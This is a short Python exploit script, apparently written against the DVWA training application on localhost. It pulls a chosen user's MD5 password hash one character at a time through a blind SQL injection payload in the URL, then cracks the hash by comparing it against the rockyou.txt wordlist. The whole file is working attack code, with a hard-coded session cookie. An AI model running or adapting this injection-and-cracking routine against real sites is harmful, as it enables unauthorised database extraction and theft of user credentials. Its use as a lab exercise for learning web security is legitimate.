#!/usr/bin/env python3

import string
import sys
import requests
import hashlib

HEADERS = {
    "Cookie": "PHPSESSID=b9tiooc285dnrcasikc2k6jg15; security=low",
}

password_hash = ""
current_test = ""
possibilities = string.ascii_lowercase + string.digits
found = False

user = sys.argv[1]

if len(sys.argv) < 2:
    print("Usage: python3 exploit.py <username>")
    sys.exit(0)

while found == False:
    for char in possibilities:
        current_test = password_hash + char
        url = f"http://127.0.0.1/vulnerabilities/sqli_blind/?id=1%27+and+%28select+count%28*%29+from+users+where+user%3D%27{user}%27+and+password+LIKE+%27{current_test}%25%27%29%3D1+%23&Submit=Submit#"
        r = requests.get(url, headers=HEADERS).text
        if "User ID is MISSING from the database." not in r:
            password_hash += char
            print("Finding hash : " + password_hash, end="\r", flush=True)
            break
        if char == "9":
            print(f"Hash found for user {user}: {password_hash}")
            found = True


def find_password(hash):
    with open("rockyou.txt", "r") as f:
        for line in f:
            if hash == hashlib.md5(line.strip().encode()).hexdigest():
                return line.strip()
        return None


if find_password(password_hash):
    print(f"Password found for user {user} : {find_password(password_hash)}")
